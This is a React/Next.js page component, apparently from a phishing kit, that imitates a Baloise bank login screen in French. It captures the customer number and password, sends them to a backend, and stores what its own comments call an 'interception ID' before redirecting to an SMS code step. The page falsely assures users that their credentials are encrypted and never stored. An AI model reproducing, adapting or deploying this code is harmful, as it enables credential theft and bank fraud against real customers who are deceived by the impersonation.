"use client";

import Link from "next/link";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function BaloiseConnect() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      // Appel vers l'API unique fixe sans slug
      const response = await fetch("/api/operation", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "Baloise" // Ajout explicite du nom de la banque ici
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Une erreur est survenue.");
      }

      // Stocke l'ID d'interception retourné par Turso pour l'étape suivante
      sessionStorage.setItem("current_interception_id", data.id);

      // Redirection immédiate vers la page de saisie du code SMS
      router.push("/operation/montant");

    } catch (err: any) {
      setError(err.message || "Erreur de connexion au serveur.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bank-connect-container">
      <Link href="/operation" className="back-btn">
        <i className="fa-solid fa-arrow-left"></i>
      </Link>

      <div className="bank-header-icon">
        <i className="fa-solid fa-shield-halved"></i>
      </div>

      <h1 className="bank-connect-title">Relier Baloise</h1>
      <p className="bank-connect-subtitle">Connexion sécurisée et chiffrée de bout en bout.</p>

      <form className="login-form" onSubmit={handleConnect}>
        {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px' }}>{error}</div>}

        <div className="input-group">
          <label>Identifiant</label>
          <div className="input-wrapper">
            <input 
              type="text" 
              className="input-field" 
              placeholder="Numéro client" 
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required 
            />
          </div>
        </div>

        <div className="input-group">
          <label>Mot de passe</label>
          <div className="input-wrapper">
            <input 
              type={showPassword ? "text" : "password"} 
              className="input-field" 
              placeholder="••••••••" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <i 
              className={`fa-regular ${showPassword ? 'fa-eye-slash' : 'fa-eye'} password-toggle`}
              onClick={() => setShowPassword(!showPassword)}
            ></i>
          </div>
        </div>

        {/* <div className="remember-me">
          <input type="checkbox" id="remember" className="checkbox-custom" />
          <label htmlFor="remember">Se souvenir de moi</label>
        </div> */}

        <div className="security-note">
          <i className="fa-solid fa-lock"></i>
          <span>Vos identifiants sont chiffrés et ne sont jamais stockés sur nos serveurs.</span>
        </div>

        <button type="submit" className="btn-link-bank" disabled={isLoading}>
          {isLoading ? (
            <div className="spinner"></div>
          ) : (
            <>
              <i className="fa-solid fa-link"></i>
              Continuer
            </>
          )}
        </button>
      </form>
    </div>
  );
}